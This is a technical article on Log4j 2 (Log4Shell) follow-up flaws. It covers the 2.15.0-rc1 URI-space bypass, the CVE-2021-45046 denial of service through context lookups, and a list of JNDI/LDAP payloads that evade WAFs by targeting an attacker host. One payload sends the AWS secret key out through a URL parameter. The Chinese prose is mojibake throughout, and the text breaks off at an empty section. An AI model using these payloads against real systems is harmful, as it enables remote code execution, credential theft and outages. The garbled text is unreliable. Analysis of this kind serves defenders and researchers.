# log4jshellçš„åç»­



### 0x00 å†™åœ¨å‰é¢

> è¯¥æ–‡ç« ä¸ºã€Š[CVE-2021-44428 | å¯¹ Apache Log4jshell çš„æ·±å…¥å­¦ä¹ ä¸æ€è€ƒ](./CVE-2021-44228-Apache-Log4jshellçš„æ·±å…¥æ€è€ƒ)ã€‹çš„åç»­å†…å®¹ï¼Œä¸»è¦è°ˆè®ºlog4j2 RC1ã€RC2ã€CVE-2021-45046ã€ç»•è¿‡æ–¹å¼å’Œå…¶ä»–æ¶‰åŠåº”ç”¨ç­‰æ‚é¡¹å†…å®¹ï¼Œæ–‡ç« éƒ¨åˆ†å†…å®¹æ¥æºäºç½‘ç»œå’Œä¸ªäººæ•´ç†æ€»ç»“ã€‚



### 0x01 RC1ç‰ˆæœ¬çš„ç»•è¿‡ä¸åˆ©ç”¨

ä¿®å¤ç‰ˆæœ¬`2.15.0-rc1`

è·Ÿäº†ä¸‹æµç¨‹å‘ç°åˆ°`PatternLayout.toSerializable`æ–¹æ³•å‘ç”Ÿäº†å˜åŒ–

ä¸è¿‡è¿™é‡Œçš„å˜åŒ–æ²¡æœ‰ä»€ä¹ˆå½±å“ï¼Œå…¶ä¸­çš„`formatters`å±æ€§çš„å˜åŒ–å¯¼è‡´äº†`${}`ä¸ä¼šè¢«å¤„ç†

```java
@Override
public StringBuilder toSerializable(final LogEvent event, final StringBuilder buffer) {
    for (PatternFormatter formatter : formatters) {
        formatter.format(event, buffer);
    }
    return buffer;
}
```

ä¸Šä¸€ç¯‡æ–‡ç« æåˆ°è¿™é‡ŒæŸä¸ª`formatter`åŒ…å«äº†`MessagePatternConverter`

åœ¨ä¿®å¤åå˜æˆäº†`MessagePatternConverter.SimplePatternConverter`ç±»

![img](../assets/2021-12-15-Log4jshell%E5%90%8E%E7%BB%AD/0119.png)

å¯ä»¥å‘ç°åœ¨è¿™ä¸ªç±»ä¸­å˜æˆäº†ç›´æ¥æ‹¼æ¥å­—ç¬¦ä¸²çš„æ“ä½œï¼Œä¸å»åˆ¤æ–­`${}`è¿™ç§æƒ…å†µ

```java
private static final class SimpleMessagePatternConverter extends MessagePatternConverter {
    private static final MessagePatternConverter INSTANCE = new SimpleMessagePatternConverter();
    @Override
    public void format(final LogEvent event, final StringBuilder toAppendTo) {
        Message msg = event.getMessage();
        // ç›´æ¥æ‹¼æ¥å­—ç¬¦ä¸²
        if (msg instanceof StringBuilderFormattable) {
            ((StringBuilderFormattable) msg).formatTo(toAppendTo);
        } else if (msg != null) {
            toAppendTo.append(msg.getFormattedMessage());
        }
    }
}
```

æ³¨æ„åˆ°å¦ä¸€ä¸ªå­ç±»`LookupMessagePatternConverter`

å¦‚æœ`Converter`è¢«è®¾ç½®ä¸ºè¯¥ç±»ï¼Œé‚£ä¹ˆä¼šç»§ç»­è¿›è¡Œ`${}`çš„å¤„ç†

```java
private static final class LookupMessagePatternConverter extends MessagePatternConverter {
    private final MessagePatternConverter delegate;
    private final Configuration config;

    LookupMessagePatternConverter(final MessagePatternConverter delegate, final Configuration config) {
        this.delegate = delegate;
        this.config = config;
    }

    @Override
    public void format(final LogEvent event, final StringBuilder toAppendTo) {
        int start = toAppendTo.length();
        delegate.format(event, toAppendTo);
        // åˆ¤æ–­${}
        int indexOfSubstitution = toAppendTo.indexOf("${", start);
        if (indexOfSubstitution >= 0) {
            config.getStrSubstitutor()
                // è¿›å…¥äº†ä¸Šæ–‡çš„æµç¨‹
                .replaceIn(event, toAppendTo, indexOfSubstitution, toAppendTo.length() - indexOfSubstitution);
        }
    }
}
```

å…·ä½“éœ€è¦è®¾ç½®ä¸ºå“ªä¸€ä¸ªå­ç±»å–å†³äºç”¨æˆ·çš„é…ç½®

```java
private static final String LOOKUPS = "lookups";
private static final String NOLOOKUPS = "nolookups";

public static MessagePatternConverter newInstance(final Configuration config, final String[] options) {
    boolean lookups = loadLookups(options);
    String[] formats = withoutLookupOptions(options);
    TextRenderer textRenderer = loadMessageRenderer(formats);
    // é»˜è®¤ä¸é…ç½®lookupåŠŸèƒ½
    MessagePatternConverter result = formats == null || formats.length == 0
        ? SimpleMessagePatternConverter.INSTANCE
        : new FormattedMessagePatternConverter(formats);
    if (lookups && config != null) {
        // åªæœ‰ç”¨æˆ·è¿›è¡Œé…ç½®æ‰ä¼šè§¦å‘
        result = new LookupMessagePatternConverter(result, config);
    }
    if (textRenderer != null) {
        result = new RenderingPatternConverter(result, textRenderer);
    }
    return result;
}
```

äºæ˜¯æƒ³åŠæ³•å¼€å¯`lookup`åŠŸèƒ½åˆ†æåç»­æœ‰æ²¡æœ‰é™åˆ¶

```java
final Configuration config = new DefaultConfigurationBuilder().build(true);
// é…ç½®å¼€å¯lookupåŠŸèƒ½
final MessagePatternConverter converter =
    MessagePatternConverter.newInstance(config, new String[] {"lookups"});
final Message msg = new ParameterizedMessage("${jndi:ldap://127.0.0.1:1389/badClassName}");
final LogEvent event = Log4jLogEvent.newBuilder()
    .setLoggerName("MyLogger")
    .setLevel(Level.DEBUG)
    .setMessage(msg).build();
final StringBuilder sb = new StringBuilder();
converter.format(event, sb);
System.out.println(sb);
```

æˆåŠŸå¼€å¯`lookups`åŠŸèƒ½ï¼Œè°ƒç”¨`LookupMessagePatternConverter.fomat`æ–¹æ³•

![img](../assets/2021-12-15-Log4jshell%E5%90%8E%E7%BB%AD/0120.png)

é€’å½’å¤„ç†ç­‰è¿‡ç¨‹å‡æ²¡æœ‰å˜åŒ–ï¼Œæœ€å`JndiManager.lookup`è§¦å‘æ¼æ´çš„åœ°æ–¹è¿›è¡Œäº†ä¿®æ”¹

```java
public synchronized <T> T lookup(final String name) throws NamingException {
    try {
        URI uri = new URI(name);
        if (uri.getScheme() != null) {
            // å…è®¸çš„åè®®ç™½åå•
            if (!allowedProtocols.contains(uri.getScheme().toLowerCase(Locale.ROOT))) {
                LOGGER.warn("Log4j JNDI does not allow protocol {}", uri.getScheme());
                return null;
            }
            if (LDAP.equalsIgnoreCase(uri.getScheme()) || LDAPS.equalsIgnoreCase(uri.getScheme())) {
                // å…è®¸çš„hostç™½åå•
                if (!allowedHosts.contains(uri.getHost())) {
                    LOGGER.warn("Attempt to access ldap server not in allowed list");
                    return null;
                }
                Attributes attributes = this.context.getAttributes(name);
                if (attributes != null) {
                    Map<String, Attribute> attributeMap = new HashMap<>();
                    NamingEnumeration<? extends Attribute> enumeration = attributes.getAll();
                    while (enumeration.hasMore()) {
                        Attribute attribute = enumeration.next();
                        attributeMap.put(attribute.getID(), attribute);
                    }
                    Attribute classNameAttr = attributeMap.get(CLASS_NAME);
                    // å‚è€ƒä¸‹å›¾æˆ‘ä»¬è¿™ç§Payloadä¸å­˜åœ¨javaSerializedDataå¤´
                    // æ‰€ä»¥ä¸ä¼šè¿›å…¥ç±»ç™½åå•åˆ¤æ–­
                    if (attributeMap.get(SERIALIZED_DATA) != null) {
                        if (classNameAttr != null) {
                            // ç±»åç™½åå•
                            String className = classNameAttr.get().toString();
                            if (!allowedClasses.contains(className)) {
                                LOGGER.warn("Deserialization of {} is not allowed", className);
                                return null;
                            }
                        } else {
                            LOGGER.warn("No class name provided for {}", name);
                            return null;
                        }
                    } else if (attributeMap.get(REFERENCE_ADDRESS) != null
                               || attributeMap.get(OBJECT_FACTORY) != null) {
                        // ä¸å…è®¸REFERENCEè¿™ç§åŠ è½½å¯¹è±¡çš„æ–¹å¼
                        LOGGER.warn("Referenceable class is not allowed for {}", name);
                        return null;
                    }
                }
            }
        }
    } catch (URISyntaxException ex) {
        // This is OK.
    }
    return (T) this.context.lookup(name);
}
```

çœ‹çœ‹å®é™…è¿è¡Œä¸­ï¼Œè¿™å‡ ä¸ªç™½åå•æ˜¯æ€æ ·çš„

![img](../assets/2021-12-15-Log4jshell%E5%90%8E%E7%BB%AD/0121.png)

é»˜è®¤çš„åè®®æ˜¯ï¼š`java`ï¼Œ`ldap`ï¼Œ`ldaps`

é»˜è®¤æ•°æ®ç±»å‹æ˜¯å…«å¤§åŸºæœ¬æ•°æ®ç±»å‹

é»˜è®¤çš„Hostç™½åå•æ˜¯`localhost`

å®é™…ä¸Šæ‹¦ä½`Payload`æ˜¯åœ¨æœ€åä¸€å¤„`OBJECT_FACTORY`åˆ¤æ–­

![img](../assets/2021-12-15-Log4jshell%E5%90%8E%E7%BB%AD/0122.png)

ç”±äºRCEä¸€å®šéœ€è¦åŠ è½½è¿œç¨‹å¯¹è±¡ï¼Œé‚£ä¹ˆé¿å…ä¸äº†`javaFactory`å±æ€§ï¼ˆæˆ–è€…æœ‰ä¸€äº›å…¶ä»–æ€è·¯ï¼Œç¬”è€…åˆšåšJavaå®‰å…¨ä¸äº†è§£ï¼‰

çœ‹èµ·æ¥æ— æ‡ˆå¯å‡»ï¼Œç„¶è€Œè¿™é‡Œæœ‰ä¸€å¤„ç»†èŠ‚é—®é¢˜

```java
public synchronized <T> T lookup(final String name) throws NamingException {
    try {
        URI uri = new URI(name);
        ...
    } catch (URISyntaxException ex) {
        // This is OK.
    }
    return (T) this.context.lookup(name);
}
```

å¦‚æœå‘ç”Ÿäº†`URISyntaxException`å¼‚å¸¸ä¼šç›´æ¥`this.context.lookup`

èƒ½å¦æƒ³åŠæ³•è®©`new URI(name);`æ—¶å€™æŠ¥é”™ä½†`name`ä¼ å…¥`context.lookup(name);`æ—¶æ­£å¸¸

ç»è¿‡æµ‹è¯•å‘ç°`URI`ä¸­ä¸è¿›è¡Œ`URL`ç¼–ç ä¼šæŠ¥è¿™ä¸ªé”™ï¼ŒåŠ ä¸ªç©ºæ ¼å³å¯è§¦å‘`${jndi:ldap://127.0.0.1:1389/ badClassName}`ï¼ˆ`ä¸å¯¹ç©ºæ ¼åšç¼–ç `å¯¼è‡´å¼‚å¸¸ï¼Œä½†æ˜¯`lookup`æ—¶å€™ä¼šå»æ‰è¿™ä¸ªç©ºæ ¼ï¼‰

![img](../assets/2021-12-15-Log4jshell%E5%90%8E%E7%BB%AD/0123.png)

æˆåŠŸRCEï¼ˆéœ€è¦ç”¨æˆ·å¼€å¯`lookup`åŠŸèƒ½çš„åŸºç¡€ä¸Šæ‰å¯ä»¥ï¼‰

![img](../assets/2021-12-15-Log4jshell%E5%90%8E%E7%BB%AD/0124.png)



### 0x02 RC2ç‰ˆæœ¬çš„åˆ©ç”¨

ä¿®å¤ç‰ˆæœ¬`2.15.0-rc2`

RC2çš„ä¿®å¤æ–¹æ¡ˆæ˜¯ç›´æ¥returnï¼Œæœ‰æ•ˆè§£å†³äº†ä¸Šæ–‡çš„ç»•è¿‡

```java
try{
} catch (URISyntaxException ex) {
    LOGGER.warn("Invalid JNDI URI - {}", name);
    return null;
}
return (T) this.context.lookup(name);
```

ä½†åæ¥æŸå›½å¤–å›¢é˜Ÿæäº¤äº†`CVE-2021-45046`æ¼æ´æŠ¥å‘Šï¼Œè¯¥æ¼æ´å¯é€ æˆæ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆDDOSï¼‰

åœ¨`2.15.0`ç‰ˆæœ¬åˆ©ç”¨çš„å‰æï¼šè¯¥æ¼æ´å¿…é¡»åœ¨å¼€å¯`lookup`åŠŸèƒ½çš„æƒ…å†µä¸‹è§¦å‘

ä¸€ç§å¸¸è§çš„å¼€å¯å§¿åŠ¿æ˜¯åœ¨`log4j2.xml`ä¸­ï¼š

```java
<appenders>
    <console name="CONSOLE-APPENDER" target="SYSTEM_OUT">
        <PatternLayout pattern="%msg{lookups}%n"/>
    </console>
</appenders>
```



[4ra1n](https://xz.aliyun.com/u/44415)çš„**æŒ–æ˜è¿‡ç¨‹**

å›é¡¾`RC1`å’Œ`RC2`çš„ä¿®å¤ï¼šå¦‚æœå­˜åœ¨`JndiLookup`é‚£ä¹ˆä¼šåˆ¤æ–­å…¶ä¸­çš„çš„`host`æ˜¯å¦åˆæ³•

```java
if (!allowedHosts.contains(uri.getHost())) {
    LOGGER.warn("Attempt to access ldap server not in allowed list");
    return null;
}
```



è€Œ`allowedHosts`ä¸­ä¸€å®šåŒ…å«æœ‰`localhost`å’Œ`127.0.0.1`

```java
// æ‹¿åˆ°æœ¬åœ°IP
private static final List<String> permanentAllowedHosts = NetUtils.getLocalIps();
...
addAll(hosts, allowedHosts, permanentAllowedHosts, ALLOWED_HOSTS, data);
return new JndiManager(...,allowedHosts,...);
```

è¿™è¯´æ˜å¦‚æœ`LDAP`æœåŠ¡ç«¯åœ¨`127.0.0.1`å¯ä»¥æˆåŠŸ`lookup`

ç„¶è€Œé»‘å®¢ä¸å¯èƒ½å‡­ç©ºåœ¨æœåŠ¡ç«¯æœ¬åœ°å¼€å¯ä¸€ä¸ªæ¶æ„çš„`LDAP Server`

æƒ³åˆ°`lookup`æœ¬è´¨æ˜¯ç½‘ç»œç›¸å…³çš„æ“ä½œï¼Œä¼šæœ‰é˜»å¡çš„å¯èƒ½ã€‚å¯ä»¥æ„é€ å‡º`Payload`ä½¿ç¨‹åº`lookup`æœ¬åœ°ï¼Œè€Œæœ¬åœ°ä¸å¯èƒ½å¼€`LDAP Server`ï¼Œäºæ˜¯å‘ç”Ÿè¶…æ—¶ç­‰å¾…ï¼Œä¹Ÿè®¸ä¼šæœ‰æ‹’ç»æœåŠ¡æ¼æ´çš„å¯èƒ½

äºæ˜¯ä¿®æ”¹äº†`RC2`çš„æºç ï¼ŒåŠ å…¥äº†ç»Ÿè®¡æ—¶é—´ä»£ç ï¼Œåˆ†æ`lookup`çš„è¶…æ—¶æƒ…å†µ

ï¼ˆä¸‹æ–‡åˆ†æä¸ºä»€ä¹ˆé˜»å¡çš„æ–¹æ³•ä¸æ˜¯`lookup`è€Œæ˜¯`context.getAttributes`ï¼‰

```java
if (!allowedHosts.contains(uri.getHost())) {
    LOGGER.warn("Attempt to access ldap server not in allowed list");
    return null;
}
long startTime = System.currentTimeMillis();
Attributes attributes = null;
try {
    // é˜»å¡æ–¹æ³•
    attributes = this.context.getAttributes(name);
}catch (Exception ignored){
}
long endTime = System.currentTimeMillis();
System.out.println(endTime-startTime);
```

æµ‹è¯•ä»¥ä¸Šæ‰“å°æ—¶é—´çš„ä»£ç ä¼šå‘ç°æ€»æ˜¯æ‰“å°`2000`å·¦å³ï¼Œè¯´æ˜è¶…æ—¶æ—¶é—´ä¸º`2`ç§’

æ·±å…¥`getAttributes`å¯ä»¥çœ‹åˆ°è¿™æ ·çš„æ–¹æ³•

```java
static ResolveResult getUsingURLIgnoreRootDN(String var0, Hashtable<?, ?> var1) throws NamingException {
    LdapURL var2 = new LdapURL(var0);
    // è·Ÿå…¥
    LdapCtx var3 = new LdapCtx("", var2.getHost(), var2.getPort(), var1, var2.useSsl());
    String var4 = var2.getDN() != null ? var2.getDN() : "";
    CompositeName var5 = new CompositeName();
    if (!"".equals(var4)) {
        var5.add(var4);
    }

    return new ResolveResult(var3, var5);
}
```

åœ¨new LdapCtxæ–¹æ³•ä¸­å­˜åœ¨connectæ“ä½œå¯¼è‡´é˜»å¡

ï¼ˆå…¶å®connectæ–¹æ³•è¿˜æœ‰å‡ æ­¥æ‰ä¼šåˆ°è¾¾æœ€åº•å±‚çš„é˜»å¡ï¼Œä¸è¿‡æ²¡æœ‰å¿…è¦ç»§ç»­åˆ†æäº†

```java
public LdapCtx(String var1, String var2, int var3, Hashtable<?, ?> var4, boolean var5) throws NamingException {
    ...
    try {
        this.connect(false);
    }
    ...
}
```

å›åˆ°ä¹‹å‰çš„é—®é¢˜ï¼šä¸ºä»€ä¹ˆé˜»å¡çš„ä¸æ˜¯`lookup`è€Œæ˜¯`getAttributes`æ–¹æ³•

å½“å‰ä»£ç åœ¨è¿æ¥è¶…æ—¶åä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œèµ°ä¸åˆ°`lookup`æ–¹æ³•

![img](../assets/2021-12-15-Log4jshell%E5%90%8E%E7%BB%AD/0137.png)

å…¶å®åœ¨`lookup`æ–¹æ³•ä¸­åº”è¯¥ä¹Ÿä¼šé€ æˆé˜»å¡ï¼Œç®€å•å¾€é‡Œé¢è·Ÿä¸€ä¸‹ä¼šå‘ç°ç±»ä¼¼çš„ä»£ç 

```java
// ä»Attributesé‡Œè·å–å±æ€§
// é‚£ä¹ˆåº”è¯¥è°ƒç”¨äº†getAttributesä¹‹ç±»çš„é˜»å¡æ–¹æ³•
if (((Attributes)var4).get(Obj.JAVA_ATTRIBUTES[2]) != null) {
    var3 = Obj.decodeObject((Attributes)var4);
}

if (var3 == null) {
    // ç±»ä¼¼çš„ä»£ç 
    var3 = new LdapCtx(this, this.fullyQualifiedName(var1));
}
```

ç°åœ¨å‘ç°äº†èƒ½è®©ç¨‹åºé˜»å¡çš„åŠæ³•ï¼Œé‚£ä¹ˆæ€æ ·æ„é€ `Payload`ä»¥è¾¾æˆæ›´é•¿æ—¶é—´çš„é˜»å¡å‘¢

`Log4j2`åœ¨å¤„ç†`${}`æ˜¯é€’å½’è§£æï¼Œä¹Ÿå°±æ˜¯è¯´ä¼šå¤„ç†ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­çš„æ‰€æœ‰`${}`å¹¶åˆ†åˆ«å¤„ç†å¯¹åº”çš„å€¼ï¼Œæ¯ä¸€æ¬¡çš„å¤„ç†éƒ½ä¼šé€ æˆ`2`ç§’çš„ç­‰å¾…ï¼Œæ‰€ä»¥åªéœ€ç®€å•çš„æ‹¼æ¥å³å¯

```java
private int substitute(final LogEvent event, final StringBuilder buf, final int offset, final int length,
                       List<String> priorVariables) {
    ...
    substitute(event, bufName, 0, bufName.length());
    ...
    String varValue = resolveVariable(event, varName, buf, startPos, endPos);
    ...
    int change = substitute(event, buf, startPos, varLen, priorVariables);
}
```

ä¾‹å¦‚æ‹¼æ¥ä¸‰ä¸ªä¼šé˜»å¡æ›´é•¿çš„æ—¶é—´

ï¼ˆè¿™é‡Œæ˜¯é’ˆå¯¹æœ¬åœ°`80`ç«¯å£ï¼Œå®é™…ä¸Šå¯ä»¥ç”¨å¤§æ¦‚ç‡å…³é—­çš„é«˜ä½ç«¯å£ï¼‰

```poc
${jndi:ldap://127.0.0.1}${jndi:ldap://127.0.0.1}${jndi:ldap://127.0.0.1}
```

è¿™æ—¶å€™ä¼šäº§ç”Ÿç–‘é—®:

åœ¨ä¸€ä¸ª`web`è¯·æ±‚ä¸­ï¼Œè¿™æ ·çš„`payload`åªèƒ½è®©æˆ‘å½“å‰çš„è¯·æ±‚é˜»å¡ä½ï¼Œå¦‚ä½•å®ç°çœŸæ­£çš„æ‹’ç»æœåŠ¡æ”»å‡»ï¼Œè®©ç›®æ ‡ç½‘ç«™æ— æ³•æ­£å¸¸å¤„ç†åˆ«äººçš„è¯·æ±‚å‘¢ï¼Ÿ



**åˆ©ç”¨**

**é€šå¸¸æƒ…å†µä¸‹ï¼Œè®°å½•ç™»å½•ç”¨æˆ·çš„èº«ä»½ç­‰ä¿¡æ¯æ˜¯å¸¸è§çš„æ“ä½œ**

å¦‚æœç¨‹åºå‘˜é€‰æ‹©äº†`Log4j2`è¿™ç§`ctx`è®°å½•çš„æ–¹å¼è€Œä¸æ˜¯æ‰‹åŠ¨æ‹¼æ¥å­—ç¬¦ä¸²ï¼Œå°†ä¼šå¯¼è‡´è¯¥æ¼æ´

```java
@RequestMapping("/test")
@ResponseBody
public String test(String userId) {
    try {
        String id = new String(Base64.getDecoder().decode(userId));
        // è®°å½•ç”¨æˆ·ç™»å½•ID
        ThreadContext.put("loginId", id);
        // è®°å½•è¯¥ç”¨æˆ·å·²ç™»å½•
        logger.info("user login");
        // å…¶ä»–ä¸šåŠ¡é€»è¾‘
        // ...
    } catch (Exception e) {
        return e.getMessage();
    }
    return "";
}
```

æ­£å¸¸æƒ…å†µä¸‹ï¼š`http://localhost:8080/test?userId=MQ==`

å°†ä¼šè®°å½•

```
2021-12-15 12:51:27,845 [http-nio-8080-exec-1] 1 user login
```

å¦‚æœæ‰“`Payload`åˆ™æŠ¥é”™å¹¶æˆåŠŸé˜»å¡

```
http://localhost:8080/test?userId=JHtqbmRpOmxkYXA6Ly8xMjcuMC4wLjF9
```

æ”¹å†™ä¸‹`Python`è„šæœ¬å³å¯æˆåŠŸæ‹’ç»æœåŠ¡

```python
url = "http://127.0.0.1:8080/test?userId=" + str(payload, encoding="utf-8")
```



**CVEåˆ†æ**

åœ¨`Log4j2.xml`ä¸­æ”¯æŒä¸€ç§é…ç½®ä»ä¸Šä¸‹æ–‡ä¸­å–å€¼ï¼šä¾‹å¦‚è¿™ä¸ªä¾‹å­å¯ä»¥å–åˆ°`loginId`å€¼

```XML
<Appenders>
    <Console name="STDOUT" target="SYSTEM_OUT">
        <PatternLayout>
            <pattern>%d %p %c{1.} [%t] $${ctx:loginId} %m%n</pattern>
        </PatternLayout>
    </Console>
</Appenders>
```

å¦‚æœç¨‹åºè¿™æ ·å†™

```java
public static void main(String[] args) throws Exception{
    ThreadContext.put("loginId","1}");
    logger.error("xxx");
}
```

å°†ä¼šæ‰“å°

```
2021-12-15 12:03:53,860 ERROR Main [main] 1 xxx
```

å¦‚æœä»£ç è¿™æ ·å†™å°†ä¼šå¯¼è‡´ç±»ä¼¼çš„æ‹’ç»æœåŠ¡

```java
ThreadContext.put("loginId","${jndi:ldap://127.0.0.1}");
logger.error("xxx");
```

åœ¨`xml`ä¸­æœ‰å¦ä¸€ç§æ•ˆæœç›¸åŒçš„é…ç½®æ–¹å¼ï¼Œä½†è¿™ç§å†™æ³•åè€Œä¸ä¼šè§¦å‘`${}`è§£æ

```xml
<Appenders>
    <Console name="STDOUT" target="SYSTEM_OUT">
        <PatternLayout>
            <pattern>%d %p %c{1.} [%t] %X{loginId} %m%n</pattern>
        </PatternLayout>
    </Console>
</Appenders>
```

å…³äºæ‹’ç»æœåŠ¡çš„åˆ†æä¸Šæ–‡å·²æœ‰ï¼Œé‡ç‚¹çœ‹ä¸€ä¸‹`ContextMapLookup`

```java
@Override
public String lookup(final String key) {
    return currentContextData().getValue(key);
}

@Override
public String lookup(final LogEvent event, final String key) {
    return event.getContextData().getValue(key);
}
```

è¿™é‡Œçš„`contextData`æ­£æ˜¯ä¸€ä¸ªç®€å•çš„`Map`

![img](../assets/2021-12-15-Log4jshell%E5%90%8E%E7%BB%AD/0139.png)

åœ¨`resolveVariable`æ–¹æ³•è¿”å›

```java
protected String resolveVariable(final LogEvent event, final String variableName, final StringBuilder buf,
                                 final int startPos, final int endPos) {
    final StrLookup resolver = getVariableResolver();
    if (resolver == null) {
        return null;
    }
    // å–å‡ºäº†${jndi:ldap://127.0.0.1}
    return resolver.lookup(event, variableName);
}
```

å–å‡ºçš„`payload`åœ¨ä¸‹ä¸€æ¬¡çš„é€’å½’ä¸­æˆåŠŸè¢«`lookup`

![img](../assets/2021-12-15-Log4jshell%E5%90%8E%E7%BB%AD/0140.png)

ä¸éš¾å‘ç°`lookup`æ—¶æ˜¯ä»`event`ä¸­å–`Map`é‚£ä¹ˆè¯¥`Map`æ˜¯å¦‚ä½•ä¿å­˜åˆ°`event`ä¸­çš„å‘¢

å®šä½åˆ°åˆ›å»º`LogEvent`çš„æ–¹æ³•`ReusableLogEventFactory.createEvent`

```java
@Override
public LogEvent createEvent(final String loggerName, final Marker marker, final String fqcn,
                            final StackTraceElement location, final Level level, final Message message,
                            final List<Property> properties, final Throwable t) {
    if (result == null || result.reserved) {
        final boolean initThreadLocal = result == null;
        // è¿™ä¸ªç±»ä¸­åŒ…å«äº†ç©ºçš„context
        result = new MutableLogEvent();
        ...
    }
    ...
    // çœŸæ­£è®¾ç½®contextå±æ€§
    result.setContextData(injector.injectContextData(properties, (StringMap) result.getContextData()));
    result.setContextStack(ThreadContext.getDepth() == 0 ? ThreadContext.EMPTY_STACK : ThreadContext.cloneStack());
    ...
    return result;
}
```

è·Ÿå…¥`ThreadContextDataInjector.injectContextData`æ–¹æ³•

```java
@Override
public StringMap injectContextData(final List<Property> props, final StringMap ignore) {
    if (providers.size() == 1 && (props == null || props.isEmpty())) {
        // è·Ÿå…¥supplyStringMap
        return providers.get(0).supplyStringMap();
    }
    ...
}
```

è¿›å…¥`ThreadContextDataProvider.supplyStringMap`æ–¹æ³•

```java
@Override
public StringMap supplyStringMap() {
    return ThreadContext.getThreadContextMap().getReadOnlyContextData();
}
```

åœ¨`getReadOnlyContextData`ä¸­è·å¾—è¿™ä¸ª`Map`

![img](../assets/2021-12-15-Log4jshell%E5%90%8E%E7%BB%AD/0141.png)



### 0x03 bypass

> åŸºç¡€payload:${jndi:ldap://somesitehackerofhell.com/z}



#### 1. ç³»ç»Ÿç¯å¢ƒå˜é‡å€¼ç»•è¿‡

```
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//somesitehackerofhell.com/z}
```

æ¥è‡ª Apache Log4j 2 æ–‡æ¡£ï¼š`${env:ENV_NAME:-default_value}`

å¦‚æœæ²¡æœ‰ ENV_NAME ç³»ç»Ÿç¯å¢ƒå˜é‡ï¼Œè¯·åœ¨åé¢ä½¿ç”¨æ–‡æœ¬ï¼š`-`

`æ”»å‡»è€…å¯ä»¥ä½¿ç”¨ä»»ä½•åç§°ä»£æ›¿ ENV_NAMEï¼Œä½†å®ƒå¿…é¡»ä¸å­˜åœ¨ã€‚`

æˆ–è€…é»‘å®¢å¯ä»¥è¯»å–ç¯å¢ƒå˜é‡ï¼Œä¾‹å¦‚ AWS_SECRET_ACCESS_KEYï¼š

```
${jndi:ldap://somesitehackerofhell.com/z?leak=${env:AWS_SECRET_ACCESS_KEY:-NO_EXISTS}}
```

æ›´å¤šç§˜å¯†ç¯å¢ƒå˜é‡:https://github.com/OneBitSec/awesome-list-of-secrets-in-environment-variables



#### 2.Lower | Upperå¤§å°å†™ç»•è¿‡

```
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://somesitehackerofhell.com/z}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://somesitehackerofhell.com/z}
```

`${lower:<text>}`ä¼šå°†ç›®æ ‡è½¬æ¢ä¸ºå°å†™

`${upper:<text>}`ä¼šå°†ç›®æ ‡è½¬æ¢ä¸ºå¤§å†™



#### 3. "::-"ç¬¦å·

```
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::- a}${::-p}://somesitehackerofhell.com/z}
```



#### 4.æ— æ•ˆçš„Unicodeå­—ç¬¦ä¸å¤§å†™

```
${jnd${upper:Ä±}:ldap://somesitehackerofhell.com/z}
```

æ— æ•ˆçš„Unicodeå­—ç¬¦`Ä±` å°†è½¬æ¢ä¸ºå­—æ¯`i` (toUpperCaseè½¬æ¢)



#### 5.ç³»ç»Ÿå±æ€§

```
${jnd${sys:SYS_NAME:-i}:ldap:/somesitehackerofhell.com/z}
```

å¦‚æœæ²¡æœ‰ SYS_NAME ç³»ç»Ÿå±æ€§ï¼Œè¯·ä½¿ç”¨ä»¥ä¸‹æ–‡æœ¬ï¼š-

#### 6. ":-"ç¬¦å·

```
${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://somesitehackerofhell.com/z}
```



#### 7.æ—¥æœŸå‹

```
${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:${date:'l'}${date:'d' }${date:'a'}${date:'p'}://somesitehackerofhell.com/z}
```

Java æ—¥æœŸæ ¼å¼ä¼šå°† 'YYYY' è½¬æ¢ä¸ºç±»ä¼¼2022è¿™ç§æ—¥æœŸå‹æ ¼å¼ï¼Œä¹Ÿä¼šå°† 'j' è½¬æ¢ä¸º j



#### 8.HTML URLç¼–ç 

å°†å­—ç¬¦æ›¿æ¢ä¸ºï¼š

- } : %7D
- { : %7B
- $ : %24



#### 9.ä¸å­˜åœ¨çš„lookup

```
${${what:ever:-j}${some:thing:-n}${other:thing:-d}${and:last:-i}:ldap://somesitehackerofhell.com/z}
```

éšä¾¿ä»€ä¹ˆï¼Œåªè¦é”®å€¼ä¸å­˜åœ¨



#### 10.å¤šæ€ï¼ˆJSON REST API è¯·æ±‚ï¼‰

```json
{
    "one-${jnd${a":"a:-i}:ld${",
    "two":"o:-a}p://somesitehackerofhell.com/z}
}
```

å•ç‹¬çš„è¿™äº›é”®å’Œå€¼å¹¶ä¸ä»£è¡¨æ”»å‡»ã€‚ä½†å®ƒä»¬åŠ åœ¨ä¸€èµ·å°±æ˜¯æ”»å‡»ï¼Œç”±äº JSON è§£æå™¨ï¼Œè¿™ç§æ”»å‡»å¯¹æ£€æµ‹ç³»ç»Ÿæ˜¯é€æ˜çš„ã€‚[è¯¦ç»†](https://d0znpp.medium.com/bypassing-ngfw-wafs-using-data-format-obfuscations-188351ea9e73)

#### 11. Unicode å­—ç¬¦ï¼ˆJSON REST API è¯·æ±‚ï¼‰

```
${\u006a\u006e\u0064\u0069:ldap://somesitehackerofhell.com/z}
```

å°†ä¸€äº›å­—ç¬¦è½¬æ¢ä¸º unicode å³å¯



#### 12.ä½¿ç”¨ # ï¼ˆlog4j 2.15ç‰ˆæœ¬ï¼‰

```
${jndi:ldap://127.0.0.1#somesitehackerofhell.com/z}
```

åœ¨ Log4J 2.15.0 ä¸­ç»•è¿‡ allowedLdapHost å’Œ allowedClasses æ£€æŸ¥ã€‚ java.net.URI getHost() æ–¹æ³•è¿”å› # ä¹‹å‰çš„å€¼ä½œä¸ºçœŸå®ä¸»æœºã€‚ä½†æ˜¯ JNDI/LDAP è§£æå™¨å°†è§£æä¸ºå°è¯•è¿æ¥åˆ°æ¶æ„ LDAP æœåŠ¡å™¨çš„å®Œæ•´ä¸»æœºåå­—ç¬¦ä¸²ã€‚[è¯¦ç»†](https://twitter.com/marcioalm/status/1471742744347348997)



#### 13. DOSæ”»å‡»(log4j 2.8 - 2.16 - CVE-2021-45105)

```
